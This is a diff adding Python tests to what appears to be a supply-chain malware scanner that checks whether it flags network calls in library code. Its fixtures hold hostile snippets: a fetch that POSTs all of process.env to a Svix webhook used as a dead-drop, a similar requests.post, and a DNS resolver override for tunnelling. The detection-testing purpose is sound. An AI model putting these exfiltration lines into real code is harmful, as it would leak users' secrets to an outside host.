@@ -3740,3 +3740,72 @@ def test_obfuscation_php_md5_dir_php_uname(tmp_path):
     )
     _, _, _, _, _, _, _, obfuscated, *_ = _build_diff(old, new)
     assert obfuscated is True
+
+
+# ── node-ipc stealer: dns.setServers() custom resolver bootstrap ──────────────
+
+
+def test_net_calls_dns_set_servers_js(tmp_path):
+    """dns.setServers() in JS library code triggers network_calls_in_lib (resolver override for DNS tunnel)."""
+    old = _write_files(tmp_path / "old", {"lib/conn.js": "// nothing\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "lib/conn.js": (
+                "// nothing\n"
+                "const dns = require('dns');\n"
+                "dns.setServers(['sh.azurestaticprovider.net:443']);\n"
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_dns_set_servers_cjs(tmp_path):
+    """dns.setServers() in .cjs triggers network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"lib/resolver.cjs": "dns.setServers(['192.168.1.1:53']);\n"},
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+# ── TanStack brandsquat: Svix webhook SaaS as C2 dead-drop ───────────────────
+
+
+def test_net_calls_svix_ingest_js(tmp_path):
+    """api.svix.com/ingest in JS triggers network_calls_in_lib (stolen .env data exfil)."""
+    old = _write_files(tmp_path / "old", {"lib/report.js": "// nothing\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "lib/report.js": (
+                "// nothing\n"
+                "fetch('https://api.svix.com/ingest/api/v1/source/src_abc123/in/', {\n"
+                "  method: 'POST', body: JSON.stringify({ env: process.env })\n"
+                "});\n"
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_svix_ingest_py(tmp_path):
+    """api.svix.com/ingest in Python library code triggers network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {"mylib/beacon.py": "# nothing\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "mylib/beacon.py": (
+                "# nothing\n"
+                "import requests\n"
+                "requests.post('https://api.svix.com/ingest/api/v1/source/src_xyz/in/', json=data)\n"
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
